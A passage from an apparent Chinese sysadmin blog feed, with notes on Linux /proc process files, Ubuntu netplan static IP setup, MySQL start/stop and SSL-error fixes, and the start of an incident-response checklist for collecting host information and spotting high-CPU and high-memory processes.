    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux在启动一个进程时，系统会在&#x2F;proc下创建一个以PID命名的文件夹，在该文件夹下会有我们的进程的信息</p><h2 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h2><h3 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h3><p>ls -lat &#x2F;proc&#x2F;pid&#x2F;exe </p><p>可查看到对应进程可执行文件的绝对路径</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@:~# ls -lat /proc/<span class="hljs-number">659535</span>/exe<br><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">0</span> Mar <span class="hljs-number">14</span> <span class="hljs-number">09</span>:<span class="hljs-number">49</span> /proc/<span class="hljs-number">659535</span>/exe -&gt; /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><h3 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h3><p>cat &#x2F;proc&#x2F;pid&#x2F;cmdline </p><p>可查看到对应进程执行的命令（没有空格）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# <span class="hljs-built_in">cat</span> /proc/1211513/cmdline<br>pingwww.baidu.com<br></code></pre></td></tr></table></figure><h3 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a>cwd</h3><p>ls -lat &#x2F;proc&#x2F;pid&#x2F;cwd</p><p>查看对应进程启动目录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@:~# ls -lat /proc/<span class="hljs-number">659535</span>/cwd<br><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">0</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> /proc/<span class="hljs-number">659535</span>/cwd -&gt; /var/lib/mysql<br></code></pre></td></tr></table></figure><h3 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h3><p>cat &#x2F;proc&#x2F;pid&#x2F;environ </p><p>查看进程运行时的环境变量</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">root@<span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /proc/659535/environ</span><br><span class="hljs-variable constant_">LANG</span>=en_US.<span class="hljs-variable constant_">UTF</span>-8PATH=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin:/usr</span><span class="hljs-regexp">/local/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/snap/binNOTIFY_SOCKET=/run/systemd/notifyPIDFILE=/run/mysqld/mysqld</span>.pidHOME=<span class="hljs-regexp">/nonexistentLOGNAME=mysqlUSER=mysqlINVOCATION_ID=4e4bec37552240ebaab8568ce9b7952fJOURNAL_STREAM=8:110456240RUNTIME_DIRECTORY=/run</span><span class="hljs-regexp">/mysqldSYSTEMD_EXEC_PID=659535MYSQLD_PARENT_PID=1</span><br></code></pre></td></tr></table></figure><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><p>ls -lat &#x2F;proc&#x2F;pid&#x2F;fd </p><p>查看进程打开或使用的文件的符号连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@:~# ls -lat /proc/<span class="hljs-number">659535</span>/fd<br><span class="hljs-attribute">total</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">dr</span>-x------ <span class="hljs-number">2</span> mysql mysql  <span class="hljs-number">0</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> .<br><span class="hljs-attribute">lr</span>-x------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">0</span> -&gt; /dev/null<br><span class="hljs-attribute">l</span>-wx------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">1</span> -&gt; /var/log/mysql/error.log<br><span class="hljs-attribute">lrwx</span>------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">10</span> -&gt; /var/lib/mysql/ibdata1<br><span class="hljs-attribute">lrwx</span>------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">11</span> -&gt; /var/lib/mysql/#innodb_redo/#ib_redo29<br><span class="hljs-attribute">lrwx</span>------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">12</span> -&gt; /var/lib/mysql/undo_002<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>filesystem</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>filesystem</tag>
      
      <tag>dir</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu_static_ip_tips</title>
    <link href="/2024/03/14/network/ip/ubuntu_static_ip_tips/"/>
    <url>/2024/03/14/network/ip/ubuntu_static_ip_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Ubuntu20.4</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>1、备份 &#x2F;etc&#x2F;netplan 下配置文件</p><p>cp &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml.bak</p><p>2、修改 &#x2F;etc&#x2F;netplan 下配置文件</p><p>yaml 文件，需要注意空格缩进</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># Let NetworkManager manage all devices on this system</span><br><span class="hljs-params">network:</span><br>  <span class="hljs-params">version:</span> <span class="hljs-number">2</span><br>  <span class="hljs-params">renderer:</span> NetworkManager<br>  <span class="hljs-params">ethernets:</span><br>    <span class="hljs-params">ens33:</span><br>      <span class="hljs-params">dhcp4:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-params">addresses:</span> <br>          <span class="hljs-operator">-</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">3.223</span><span class="hljs-symbol">/24</span><br>      <span class="hljs-params">routes:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-params">to:</span> default<br>            <span class="hljs-params">via:</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span><br>ubuntu@ubuntu-virtual-machine:<span class="hljs-operator">/</span><br></code></pre></td></tr></table></figure><p>3、应用当前配置</p><p>sudo netplan apply</p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><h3 id="配置后没有网络"><a href="#配置后没有网络" class="headerlink" title="配置后没有网络"></a>配置后没有网络</h3><h4 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h4><p>ip  a  对应网卡没有IP信息</p><p>图形界面也没有网络信息，右上角开关按钮-&gt;Settings-&gt;Network 只有 VPN 和 Network Proxy ，没有 Wired</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>停止网络服务，删除缓存信息，启动网络服务</p><p>service NetworkManager stop</p><p>rm -rf &#x2F;var&#x2F;lib&#x2F;NetworkManager&#x2F;NetworkManager.state</p><p>service NetworkManager start </p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>ip</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>ip</tag>
      
      <tag>ubuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql_op</title>
    <link href="/2024/03/13/db/mysql/mysql_op/"/>
    <url>/2024/03/13/db/mysql/mysql_op/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录日常mysql数据的操作命令</p><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="启动停止"><a href="#启动停止" class="headerlink" title="启动停止"></a>启动停止</h2><p>net start mysql</p><p>net stop mysql</p>]]></content>
    
    
    <categories>
      
      <category>db</category>
      
      <category>mysql</category>
      
      <category>mysql_op</category>
      
    </categories>
    
    
    <tags>
      
      <tag>db</tag>
      
      <tag>mysql</tag>
      
      <tag>mysql_op</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql_error</title>
    <link href="/2024/03/13/db/mysql/mysql_error/"/>
    <url>/2024/03/13/db/mysql/mysql_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对日常工作过程中遇到的mysql报错问题及解决方案汇总总结</p><h1 id="登录错误"><a href="#登录错误" class="headerlink" title="登录错误"></a>登录错误</h1><h2 id="unsupported-protocol"><a href="#unsupported-protocol" class="headerlink" title="unsupported protocol"></a>unsupported protocol</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>终端中使用 mysql -h host -u name -p 命令连接mysql数据库，提示协议不支持</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">ERROR </span>2026 (HY000): SSL connection error: error:0A000102:SSL routines::unsupported protocol<br></code></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>增加–ssl-mode参数，忽略ssl认证</p><p>mysql -h host -u user -p –ssl-mode&#x3D;DISABLED</p><p>官方文档：</p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/connection-options.html#option_general_ssl-mode">https://dev.mysql.com/doc/refman/8.0/en/connection-options.html#option_general_ssl-mode</a></p><h3 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h3><p>【1】mysql 客户端SSL错误2026 (HY000) tmaczt 2022-05-10 20:19:05</p><p>链接：<a href="https://blog.csdn.net/tmaczt/article/details/124696188">https://blog.csdn.net/tmaczt/article/details/124696188</a></p>]]></content>
    
    
    <categories>
      
      <category>db</category>
      
      <category>mysql</category>
      
      <category>mysql_error</category>
      
    </categories>
    
    
    <tags>
      
      <tag>db</tag>
      
      <tag>mysql</tag>
      
      <tag>mysql_error</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sec_response</title>
    <link href="/2024/03/12/security/secresponse/sec_response/"/>
    <url>/2024/03/12/security/secresponse/sec_response/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><h3 id="主机信息-hostnamectl"><a href="#主机信息-hostnamectl" class="headerlink" title="主机信息 hostnamectl"></a>主机信息 hostnamectl</h3><p>Static hostname ：主机名，来自&#x2F;etc&#x2F;hostname</p><p>Machine ID ：设备唯一标识</p><p>Virtualization：kvm 虚拟化，可以用来标记是否是虚拟机，物理机不存在该数据</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">root@iZbp1191gh7vw52537lyxrZ:<span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span>test<span class="hljs-comment"># hostnamectl</span><br> Static <span class="hljs-params">hostname:</span> iZbp1191gh7vw52537lyxrZ<br> Pretty <span class="hljs-params">hostname:</span> aliyun<span class="hljs-comment">#@##@</span><br>       Icon <span class="hljs-params">name:</span> computer-vm<br>         <span class="hljs-params">Chassis:</span> vm<br>      Machine <span class="hljs-params">ID:</span> <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-params">ID:</span> <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-params">Virtualization:</span> kvm<br>Operating <span class="hljs-params">System:</span> Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>          <span class="hljs-params">Kernel:</span> Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">7</span>3-generic<br>    <span class="hljs-params">Architecture:</span> x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-params">Vendor:</span> Alibaba Cloud<br>  Hardware <span class="hljs-params">Model:</span> Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><h3 id="系统时间-date"><a href="#系统时间-date" class="headerlink" title="系统时间 date"></a>系统时间 date</h3><p>确认当前系统时间是否正确，为文件时间属性判断提供依据</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># date</span><br><span class="hljs-title class_">Wed</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span> <span class="hljs-title class_">AM</span> <span class="hljs-title class_">CST</span> <span class="hljs-number">2024</span><br></code></pre></td></tr></table></figure><h3 id="系统开机运行时间"><a href="#系统开机运行时间" class="headerlink" title="系统开机运行时间"></a>系统开机运行时间</h3><h4 id="who-b-开机时间"><a href="#who-b-开机时间" class="headerlink" title="who -b 开机时间"></a>who -b 开机时间</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># who -b</span><br>         system boot  <span class="hljs-number">2023</span><span class="hljs-number">-07</span><span class="hljs-number">-10</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h4 id="uptime-p-运行时长"><a href="#uptime-p-运行时长" class="headerlink" title="uptime -p 运行时长"></a>uptime -p 运行时长</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># uptime -p</span><br>up <span class="hljs-number">35</span> weeks, <span class="hljs-number">2</span> days, <span class="hljs-number">3</span> minutes<br></code></pre></td></tr></table></figure><h3 id="系统版本信息"><a href="#系统版本信息" class="headerlink" title="系统版本信息"></a>系统版本信息</h3><h4 id="lsb-release-a"><a href="#lsb-release-a" class="headerlink" title="lsb_release -a"></a><strong>lsb_release -a</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# lsb_release<br><span class="hljs-attribute">LSB</span> Version:core-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch:security-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch<br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# lsb_release -a<br><span class="hljs-attribute">LSB</span> Version:core-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch:security-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch<br><span class="hljs-attribute">Distributor</span> ID:Ubuntu<br><span class="hljs-attribute">Description</span>:Ubuntu <span class="hljs-number">22</span>.<span class="hljs-number">04</span>.<span class="hljs-number">2</span> LTS<br><span class="hljs-attribute">Release</span>:<span class="hljs-number">22</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">Codename</span>:jammy<br></code></pre></td></tr></table></figure><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">(base) [root@aliyun-<span class="hljs-number">39</span>_106_2_51 ~]<span class="hljs-comment"># lsb_release -a</span><br>LSB <span class="hljs-params">Version:</span><span class="hljs-meta">:core</span>-<span class="hljs-number">4</span>.<span class="hljs-number">1</span><span class="hljs-operator">-</span>amd64:core-<span class="hljs-number">4</span>.<span class="hljs-number">1</span><span class="hljs-operator">-</span>noarch<br>Distributor <span class="hljs-params">ID:</span>CentOS<br><span class="hljs-params">Description:</span>CentOS Linux release <span class="hljs-number">7.8</span>.<span class="hljs-number">2003</span> (Core)<br><span class="hljs-params">Release:</span><span class="hljs-number">7.8</span>.<span class="hljs-number">2003</span><br><span class="hljs-params">Codename:</span>Core<br></code></pre></td></tr></table></figure><h5 id="CentOS系列"><a href="#CentOS系列" class="headerlink" title="CentOS系列"></a>CentOS系列</h5><p><strong>cat &#x2F;etc&#x2F;redhat-release</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">(base) [root@110 cron.d]# <span class="hljs-built_in">cat</span> /etc/redhat-release<br>CentOS Linux release 7.9.2009 (Core)<br><br>centos6也可以查看 /etc/issue<br>[root@rdimtools1.ops.xlzbb1 /tmp]# <span class="hljs-built_in">cat</span> /etc/issue<br>CentOS release 6.5 (Final)<br>Kernel \r on an \m<br></code></pre></td></tr></table></figure><h3 id="内核版本-uname-a"><a href="#内核版本-uname-a" class="headerlink" title="内核版本 uname -a"></a>内核版本 uname -a</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">ubuntu<span class="hljs-title">@VM-8-5-ubuntu</span>:~$ uname -a<br>Linux VM<span class="hljs-number">-8</span><span class="hljs-number">-5</span>-ubuntu <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span><span class="hljs-number">-77</span>-generic <span class="hljs-variable">#86</span>-Ubuntu SMP Thu Jun <span class="hljs-number">17</span> <span class="hljs-number">02</span>:<span class="hljs-number">35</span>:<span class="hljs-number">03</span> UTC <span class="hljs-number">2021</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br><br>(base) [root<span class="hljs-title">@110</span> cron.d]# uname -a<br>Linux <span class="hljs-number">110</span> <span class="hljs-number">3.10</span>.<span class="hljs-number">0</span><span class="hljs-number">-693.2</span>.<span class="hljs-number">2</span>.el<span class="hljs-number">7</span>.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-variable">#1</span> SMP Tue Sep <span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">26</span>:<span class="hljs-number">13</span> UTC <span class="hljs-number">2017</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br><br>[root<span class="hljs-title">@rdimtools1.ops.xlzbb1</span> /tmp]# uname -a<br>Linux rdimtools<span class="hljs-number">1</span>.ops.xlzbb<span class="hljs-number">1</span>.node.com <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span><span class="hljs-number">-431.11</span>.<span class="hljs-number">2</span>.el<span class="hljs-number">6</span>.toa.<span class="hljs-number">2</span>.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-variable">#1</span> SMP Wed Apr <span class="hljs-number">9</span> <span class="hljs-number">15</span>:<span class="hljs-number">55</span>:<span class="hljs-number">33</span> CST <span class="hljs-number">2014</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br></code></pre></td></tr></table></figure><p>结果解释，如果只需要看内核版本，直接uname -r即可：</p><p>Linux 110 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU&#x2F;Linux</p><table><thead><tr><th>内核名称(-s)</th><th>主机名(-n)</th><th>内核(-r)</th><th>内核版本(-v)</th><th>硬件32位&#x2F;64位(-m)</th><th>处理器类型(-p)</th><th>硬件平台(-i)</th><th>操作系统(-o)</th></tr></thead><tbody><tr><td>Linux</td><td>110</td><td>3.10.0-693.2.2.el7.x86_64</td><td>#1 SMP Tue Sep 12 22:26:13 UTC 2017</td><td>x86_64</td><td>x86_64</td><td>x86_64</td><td>GNU&#x2F;Linux</td></tr></tbody></table><h3 id="主机名-hostname"><a href="#主机名-hostname" class="headerlink" title="主机名 hostname"></a>主机名 hostname</h3><p>cenots6：读取的是 &#x2F;etc&#x2F;sysconfig&#x2F;network 中的配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@rdimtools1.ops.xlzbb1 /tmp]</span><span class="hljs-comment"># cat /etc/sysconfig/network</span><br><span class="hljs-attr">NETWORKING</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">HOSTNAME</span>=rdimtools1.ops.xlzbb1.node.com<br></code></pre></td></tr></table></figure><p>centos7,8&#x2F;ubuntu：读取的是 &#x2F;etc&#x2F;hostname中的值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> cron.d]<span class="hljs-meta"># cat /etc/hostname</span><br><span class="hljs-number">110</span><br></code></pre></td></tr></table></figure><h2 id="止损"><a href="#止损" class="headerlink" title="止损"></a>止损</h2><h3 id="排查异常进程"><a href="#排查异常进程" class="headerlink" title="排查异常进程"></a>排查异常进程</h3><h4 id="检查高CPU进程"><a href="#检查高CPU进程" class="headerlink" title="检查高CPU进程"></a>检查高CPU进程</h4><h5 id="top-c-o-CPU"><a href="#top-c-o-CPU" class="headerlink" title="top -c -o +%CPU"></a>top -c -o +%CPU</h5><p>以CPU占比倒序</p><h5 id="ps-eo-pid-ppid-cpu-mem-cmd-–sort-cpu-head-n-5"><a href="#ps-eo-pid-ppid-cpu-mem-cmd-–sort-cpu-head-n-5" class="headerlink" title="ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%cpu | head -n 5"></a><strong>ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%cpu | head -n 5</strong></h5><p>ps查询进程，显示pid，ppid，cpu占比，内存占比，进程信息，以cpu占比倒序，只显示top5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps -eo pid,ppid,%cpu,%mem,cmd --sort=-%cpu | head -n <span class="hljs-number">5</span><br>    <span class="hljs-attribute">PID</span>    PPID %CPU %MEM CMD<br> <span class="hljs-attribute">442637</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">7</span>  <span class="hljs-number">1</span>.<span class="hljs-number">5</span> /usr/local/aegis/aegis_client/aegis_11_83/AliYunDunMonitor<br> <span class="hljs-attribute">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">5</span> <span class="hljs-number">38</span>.<span class="hljs-number">8</span> /usr/sbin/mysqld<br>     <span class="hljs-attribute">92</span>       <span class="hljs-number">2</span>  <span class="hljs-number">0</span>.<span class="hljs-number">4</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span><span class="hljs-meta"> [kswapd0]</span><br> <span class="hljs-attribute">442626</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">4</span>  <span class="hljs-number">0</span>.<span class="hljs-number">7</span> /usr/local/aegis/aegis_client/aegis_11_83/AliYunDun<br></code></pre></td></tr></table></figure><h4 id="检查高内存进程"><a href="#检查高内存进程" class="headerlink" title="检查高内存进程"></a>检查高内存进程</h4><h5 id="top-c-o-MEM"><a href="#top-c-o-MEM" class="headerlink" title="top -c -o +%MEM"></a>top -c -o +%MEM</h5><p>以内存占比倒序</p><h5 id="ps-eo-pid-ppid-cpu-mem-cmd-–sort-mem-head-n-5"><a href="#ps-eo-pid-ppid-cpu-mem-cmd-–sort-mem-head-n-5" class="headerlink" title="ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%mem | head -n 5"></a>ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%mem | head -n 5</h5><p>ps查询进程，显示pid，ppid，cpu占比，内存占比，进程信息，以内存占比倒序，只显示top5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps -eo pid,ppid,%cpu,%mem,cmd --sort=-%mem | head -n <span class="hljs-number">5</span><br>    <span class="hljs-attribute">PID</span>    PPID %CPU %MEM CMD<br> <span class="hljs-attribute">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">5</span> <span class="hljs-number">38</span>.<span class="hljs-number">8</span> /usr/sbin/mysqld<br> <span class="hljs-attribute">577393</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">2</span>.<span class="hljs-number">9</span> /sbin/multipathd -d -s<br>  <span class="hljs-attribute">82956</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">2</span>  <span class="hljs-number">2</span>.<span class="hljs-number">3</span> /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock<br> <span class="hljs-attribute">577430</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">2</span>  <span class="hljs-number">1</span>.<span class="hljs-number">5</span> /usr/bin/containerd<br></code></pre></td></tr></table></figure><h4 id="检查高流量进程"><a href="#检查高流量进程" class="headerlink" title="检查高流量进程"></a>检查高流量进程</h4><p>需要额外命令 nethogs，可能更改某些文件时间属性，影响通过文件时间判断</p><h5 id="centos命令安装"><a href="#centos命令安装" class="headerlink" title="centos命令安装"></a>centos命令安装</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> epel-release <br>yum -y <span class="hljs-keyword">install</span> nethogs<br></code></pre></td></tr></table></figure><h5 id="ubuntu命令安装"><a href="#ubuntu命令安装" class="headerlink" title="ubuntu命令安装"></a>ubuntu命令安装</h5><figure 